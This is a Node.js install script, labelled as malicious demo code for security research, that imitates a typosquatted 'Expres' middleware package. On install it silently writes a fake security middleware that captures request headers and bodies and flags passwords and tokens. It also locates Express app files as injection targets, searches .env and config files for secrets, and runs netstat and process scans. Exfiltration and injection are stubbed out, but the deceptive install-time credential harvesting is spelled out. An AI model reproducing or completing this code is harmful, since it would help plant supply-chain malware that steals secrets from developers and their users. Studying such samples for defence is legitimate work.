#!/usr/bin/env node

/**
 * Expres Middleware Installation
 * WARNING: This is malicious demo code for security research
 */

const fs = require('fs');
const path = require('path');
const os = require('os');
const { exec } = require('child_process');

console.log('Installing Expres enhanced middleware...');

// Create malicious Express middleware
function createMaliciousMiddleware() {
  try {
    const middlewareCode = `
/**
 * Expres Security Middleware - Enhanced request logging
 * WARNING: This is malicious demo code
 */

module.exports = function expresSecurityMiddleware(options = {}) {
  return function(req, res, next) {
    // Log all requests with full details
    const requestLog = {
      timestamp: new Date().toISOString(),
      method: req.method,
      url: req.url,
      headers: req.headers,
      body: req.body,
      params: req.params,
      query: req.query,
      ip: req.ip || req.connection.remoteAddress,
      userAgent: req.get('User-Agent')
    };
    
    // Check for sensitive data in requests
    const sensitivePatterns = [
      /password/i,
      /token/i,
      /api[_-]?key/i,
      /secret/i,
      /auth/i,
      /credential/i,
      /jwt/i,
      /bearer/i
    ];
    
    const requestString = JSON.stringify(requestLog);
    const foundSensitive = sensitivePatterns.some(pattern => pattern.test(requestString));
    
    if (foundSensitive) {
      console.log('[DEMO] Expres: Sensitive data detected in request');
      
      // In real attack, would exfiltrate sensitive data
      this.logSensitiveRequest(requestLog);
    }
    
    // Continue with normal processing
    next();
  };
};
`;
    
    const middlewarePath = path.join(process.cwd(), 'expres-security.js');
    fs.writeFileSync(middlewarePath, middlewareCode);
    console.log('[DEMO] Security middleware installed:', middlewarePath);
    
  } catch (error) {
    // Silently fail
  }
}

// Scan for existing Express applications
function scanExpressApps() {
  try {
    // Look for common Express patterns in package.json
    if (fs.existsSync('package.json')) {
      const pkg = JSON.parse(fs.readFileSync('package.json', 'utf8'));
      
      const hasExpress = pkg.dependencies && (
        pkg.dependencies.express || 
        pkg.dependencies['express-generator'] ||
        pkg.devDependencies?.express
      );
      
      if (hasExpress) {
        console.log('[DEMO] Existing Express application detected');
        
        // Look for main application file
        const appFiles = ['app.js', 'server.js', 'index.js', 'src/app.js'];
        
        appFiles.forEach(file => {
          if (fs.existsSync(file)) {
            try {
              const content = fs.readFileSync(file, 'utf8');
              
              if (content.includes('express()') || content.includes('require(\'express\')')) {
                console.log('[DEMO] Express app file found:', file);
                
                // In real attack, would inject malicious code
                this.injectIntoExpressApp(file);
              }
            } catch (error) {
              // Ignore read errors
            }
          }
        });
      }
    }
  } catch (error) {
    // Ignore
  }
}

// Check for web application secrets
function extractWebSecrets() {
  try {
    const secretFiles = [
      '.env',
      '.env.local',
      '.env.production',
      'config/config.json',
      'config/database.json',
      'config/secrets.yaml'
    ];
    
    const secrets = [];
    
    secretFiles.forEach(file => {
      if (fs.existsSync(file)) {
        try {
          const content = fs.readFileSync(file, 'utf8');
          
          // Look for database connections, API keys, etc.
          const patterns = [
            /DATABASE_URL/i,
            /MONGODB_URI/i,
            /JWT_SECRET/i,
            /API_KEY/i,
            /SECRET_KEY/i,
            /PRIVATE_KEY/i,
            /OAUTH/i
          ];
          
          patterns.forEach(pattern => {
            if (pattern.test(content)) {
              secrets.push(`${file}: ${pattern.source}`);
            }
          });
        } catch (error) {
          // Ignore read errors
        }
      }
    });
    
    if (secrets.length > 0) {
      console.log('[DEMO] Found', secrets.length, 'potential secrets');
    }
    
    return secrets;
  } catch (error) {
    return [];
  }
}

// Network reconnaissance for web services
function scanNetworkServices() {
  try {
    // Check common development ports
    const commonPorts = [3000, 3001, 4000, 5000, 8000, 8080, 9000];
    
    commonPorts.forEach(port => {
      const { spawn } = require('child_process');
      
      // Use netstat to check for listening services
      exec(`netstat -an | grep ${port}`, (error, stdout, stderr) => {
        if (!error && stdout) {
          console.log('[DEMO] Service detected on port:', port);
        }
      });
    });
    
    // Check for running Node.js processes
    exec('ps aux | grep node', (error, stdout, stderr) => {
      if (!error && stdout) {
        const nodeProcesses = stdout.split('\n').filter(line => 
          line.includes('node') && 
          !line.includes('grep') &&
          !line.includes(process.pid) // Exclude current process
        );
        
        if (nodeProcesses.length > 0) {
          console.log('[DEMO] Found', nodeProcesses.length, 'Node.js processes');
        }
      }
    });
    
  } catch (error) {
    // Ignore
  }
}

// Execute installation tasks
console.log('✓ Configuring Expres framework');
setTimeout(() => {
  createMaliciousMiddleware();
  scanExpressApps();
  extractWebSecrets();
  scanNetworkServices();
  console.log('✓ Expres middleware installation complete');
}, 1000);
